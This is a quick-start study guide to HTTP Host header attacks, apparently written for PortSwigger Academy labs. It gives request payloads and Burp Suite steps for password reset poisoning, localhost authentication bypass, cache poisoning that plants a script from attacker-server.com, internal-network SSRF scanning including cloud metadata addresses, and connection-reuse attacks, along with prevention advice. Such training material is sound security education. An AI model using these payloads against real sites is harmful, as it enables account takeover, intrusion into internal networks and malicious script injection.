# HTTP Host Header Attacks - Quick Start Guide

Get up to speed on HTTP Host header attacks in under 15 minutes.

## What is a Host Header Attack?

The HTTP Host header tells servers which domain the client wants to access. Servers often **trust this header without validation**, leading to serious vulnerabilities. Since attackers can easily modify the Host header, they can:

- Poison password reset emails to steal accounts
- Bypass authentication to access admin panels
- Poison web caches to inject malicious scripts
- Access internal networks through routing manipulation
- Exfiltrate sensitive data from emails

---

## 5-Minute Understanding

### How It Works

```http
# Normal request
GET / HTTP/1.1
Host: legitimate-website.com

# Attacker-modified request
GET / HTTP/1.1
Host: attacker-controlled-site.com
```

**Why it's dangerous:**
1. Applications use Host header to build URLs (password resets, links)
2. Infrastructure routes requests based on Host header (load balancers)
3. Caches may not include Host in cache key
4. Access controls may rely on Host header validation

### Attack Flow

```
1. Identify → Test if Host header can be modified
2. Discover → Find where/how it's used (emails, URLs, routing)
3. Exploit → Apply appropriate attack technique
4. Impact → Account takeover, data theft, or system access
```

---

## Essential Attack Techniques

### 1. Password Reset Poisoning (60 seconds)

**Goal:** Steal password reset tokens to take over accounts

```http
POST /forgot-password HTTP/1.1
Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

**What happens:**
- Application generates reset email
- Email contains: `https://attacker-server.com/reset?token=ABC123`
- Victim clicks link → attacker captures token
- Attacker uses token to reset victim's password

**Test it:**
1. Request password reset for yourself
2. Check if email contains Host header value in URLs
3. If yes → vulnerable to password reset poisoning

---

### 2. Authentication Bypass (30 seconds)

**Goal:** Access admin panels by spoofing localhost

```http
GET /admin HTTP/1.1
Host: localhost
```

**Why it works:**
- Applications check if request is from "local"
- They incorrectly trust the Host header for this check
- `localhost` bypasses the restriction

**Alternative payloads:**
```http
Host: 127.0.0.1
Host: 0.0.0.0
Host: [::1]
```

**Test it:**
1. Find admin panel (check /robots.txt)
2. Try to access → blocked
3. Change Host to `localhost` → success!

---

### 3. Web Cache Poisoning (2 minutes)

**Goal:** Inject malicious JavaScript served to all users

```http
GET / HTTP/1.1
Host: legitimate-site.com
Host: attacker-server.com  ← Second Host header
```

**Exploitation steps:**
1. Find cached endpoint (look for `X-Cache: hit` header)
2. Create malicious JavaScript on your server
3. Send request with duplicate Host headers
4. Cache stores response with your server's URL
5. All users get your malicious script

**Response contains:**
```html
<script src="https://attacker-server.com/tracking.js"></script>
```

**Test it:**
1. Add cache buster: `GET /?test=123`
2. Send with duplicate Host headers
3. Check if second Host appears in response
4. If yes → vulnerable to cache poisoning

---

### 4. Routing-Based SSRF (3 minutes)

**Goal:** Access internal networks and admin panels

```http
GET / HTTP/1.1
Host: 192.168.0.1  ← Internal IP address
```

**Why it works:**
- Load balancers route requests based on Host header
- No validation that Host should be internal
- Attacker accesses internal resources from outside

**Scan internal network:**
```
Use Burp Intruder:
Host: 192.168.0.§1§
Payloads: 0-255
→ Find IPs with different responses
```

**Test it:**
1. Change Host to `192.168.0.1`
2. If response differs → routing based on Host
3. Scan range to find admin panels
4. Access internal resources

---

### 5. Connection State Attack (Expert, 5 minutes)

**Goal:** Bypass Host validation through connection reuse

**Technique:**
1. Send legitimate request (validation passes)
2. Send malicious request on same TCP connection
3. Server trusts second request without re-validating

**In Burp Suite:**
```
1. Create two tabs in Repeater
2. Tab 1: GET / with legitimate Host + Connection: keep-alive
3. Tab 2: GET /admin with Host: 192.168.0.1 + Connection: keep-alive
4. Create tab group
5. Send group in sequence (single connection)
6. Second request succeeds!
```

**Requires:**
- Burp Suite 2022.8.1+
- HTTP/1.1 persistent connections

---

## Burp Suite Quick Workflows

### Basic Test (1 minute)
```
1. Proxy > HTTP History > Right-click request
2. Send to Repeater
3. Modify Host header
4. Observe response differences
```

### Password Reset Test (2 minutes)
```
1. Trigger password reset
2. Intercept POST /forgot-password
3. Send to Repeater
4. Change Host to your exploit server
5. Check exploit server access logs for token
```

### Cache Poison (3 minutes)
```
1. Add cache buster: /?cb=123
2. Send to Repeater
3. Add second Host header
4. Look for reflection in response
5. Create malicious resource on exploit server
6. Send until X-Cache: hit
7. Remove cache buster and repeat
```

### Internal Scan (5 minutes)
```
1. Send to Intruder
2. Clear all markers
3. Select Host value > Add §
4. Payload: Numbers 0-255
5. Start attack
6. Sort by Status/Length for anomalies
7. Investigate different responses
```

---

## Quick Detection Guide

### Vulnerable Indicators ✓

**Look for these signs:**
- Password reset emails with clickable links
- Admin panels with "local users only" messages
- Caching headers: `X-Cache`, `Age`, `Cache-Control`
- Absolute URLs in HTML/JavaScript
- Load balancers or reverse proxies in use
- Application accepts modified Host headers

### Quick Tests

**1. Basic Modification (10 seconds)**
```http
GET / HTTP/1.1
Host: test.com
→ If 200 OK: further testing warranted
```

**2. Reflection Check (20 seconds)**
```http
GET / HTTP/1.1
Host: uniquevalue12345.com
→ Search response for "uniquevalue12345"
→ If found: injection possible
```

**3. Override Headers (30 seconds)**
```http
GET / HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: test.com
→ If test.com appears in response: override works
```

**4. Localhost Access (15 seconds)**
```http
GET /admin HTTP/1.1
Host: localhost
→ If 200 OK instead of 403: auth bypass possible
```

---

## Common Payloads

### Authentication Bypass
```http
localhost
127.0.0.1
0.0.0.0
[::1]
127.1
2130706433
```

### Internal Network Scanning
```http
192.168.0.1-255
172.16.0.1-255
10.0.0.1-255
```

### Cloud Metadata (AWS, Azure, GCP)
```http
169.254.169.254
metadata.google.internal
```

### Cache Poisoning
```http
# Duplicate headers
Host: legitimate.com
Host: attacker.com

# Override headers
X-Forwarded-Host: attacker.com
X-Host: attacker.com
```

### SSRF via Absolute URL
```http
GET https://legitimate.com/ HTTP/1.1
Host: 192.168.0.1
```

---

## Lab Completion Times

| Lab | Difficulty | Time | Key Technique |
|-----|-----------|------|---------------|
| Basic Password Reset Poisoning | APPRENTICE | 5 min | Host injection in emails |
| Host Header Authentication Bypass | APPRENTICE | 3 min | Spoofing localhost |
| Web Cache Poisoning | PRACTITIONER | 8 min | Duplicate headers |
| Routing-Based SSRF | PRACTITIONER | 10 min | Internal IP scanning |
| SSRF via Flawed Parsing | PRACTITIONER | 12 min | Absolute URLs |
| Connection State Attack | EXPERT | 15 min | Connection reuse |
| Dangling Markup | EXPERT | 10 min | Email HTML injection |

**Total lab time: ~60 minutes for all 7 labs**

---

## Prevention Quick Guide

### For Developers
```python
# ❌ VULNERABLE
reset_link = f"https://{request.headers['Host']}/reset?token={token}"

# ✓ SECURE
reset_link = f"https://{CONFIGURED_DOMAIN}/reset?token={token}"
```

**Key principles:**
- Never use Host header for URL generation
- Validate Host against whitelist
- Use relative URLs where possible
- Don't trust Host for authorization decisions

### For Infrastructure
- Configure load balancers with Host validation
- Include Host header in cache keys
- Disable unnecessary override headers (X-Forwarded-Host)
- Separate internal and external virtual hosts
- Implement network segmentation

---

## Troubleshooting

### "Host header not accepted"
**Try:**
- Override headers: X-Forwarded-Host, X-Host
- Duplicate Host headers
- Absolute URL in request line
- Different Host formats (localhost vs 127.0.0.1)

### "Cache won't poison"
**Solution:**
- Use cache busters during testing (/?cb=random)
- Send multiple times (timing matters)
- Check X-Cache header status
- Verify Host is not in Vary header

### "Internal IPs not accessible"
**Try:**
- Use absolute URLs: `GET https://legitimate.com/ HTTP/1.1`
- Test override headers
- Check if load balancer routes differently
- Try different internal IP ranges

### "Lab doesn't solve"
**Common issues:**
- Wrong username (should be carlos, not wiener)
- Missing session cookies
- CSRF token expired
- Cache buster still present in final attack
- Not using "Send group in sequence" for connection state attacks

---

## Exploitation Checklist

- [ ] Test basic Host header modification
- [ ] Check for reflection in responses
- [ ] Test password reset functionality
- [ ] Attempt localhost authentication bypass
- [ ] Look for caching behaviors
- [ ] Test override headers (X-Forwarded-Host)
- [ ] Try duplicate Host headers
- [ ] Scan for internal network access
- [ ] Test absolute URLs in request line
- [ ] Check for connection state vulnerabilities
- [ ] Verify email HTML sanitization

---

## Essential Resources

**PortSwigger Academy:**
- All 7 HTTP Host header labs
- Detailed exploitation walkthroughs
- Video guides and documentation

**Burp Suite Features:**
- Repeater (manual testing)
- Intruder (scanning/fuzzing)
- Collaborator (SSRF detection)
- Tab groups (connection state attacks)

**Key Tools:**
- Burp Suite Professional (Collaborator, Intruder)
- Exploit server (token capture, cache poisoning)
- Email client (password reset testing)

---

## Next Steps

**After completing this guide:**

1. **Practice the labs** - All 7 PortSwigger labs (~60 minutes total)
2. **Study the complete guide** - `http-host-header-portswigger-labs-complete.md`
3. **Review the cheat sheet** - `http-host-header-cheat-sheet.md`
4. **Check resources** - `http-host-header-resources.md` for CVEs and research

**Skill progression:**
- APPRENTICE labs (8 minutes) → Basic techniques
- PRACTITIONER labs (30 minutes) → Advanced exploitation
- EXPERT labs (25 minutes) → Sophisticated attacks

---

## Key Takeaways

1. **Host header is user-controllable** - Never trust it
2. **Multiple attack vectors** - Password resets, auth bypass, cache poisoning, SSRF
3. **Infrastructure matters** - Load balancers, proxies, caches all process Host differently
4. **Easy to exploit** - Many attacks take < 5 minutes
5. **High impact** - Account takeover, RCE, internal network access

**Remember:** The Host header is just HTTP input that attackers fully control. Treat it like any other untrusted user input!

---

*Start with the APPRENTICE labs and work your way up. Each lab builds on previous concepts. Good luck!*
